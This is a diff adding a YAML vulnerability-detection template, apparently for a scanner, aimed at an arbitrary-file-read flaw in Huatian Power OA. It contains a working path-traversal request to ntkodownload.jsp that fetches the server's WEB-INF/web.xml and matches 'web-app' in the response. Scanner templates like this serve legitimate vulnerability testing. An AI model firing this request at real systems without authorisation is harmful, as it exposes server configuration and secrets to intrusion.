@@ -1,0 +1,22 @@
+id:
+
+info:
+  name: 华天动力OA ntkodownload.jsp 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml
+  headers:
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Connection: close
+response1:
+  headers:
+  body: web-app
+  code:
+requests2:
+response2:
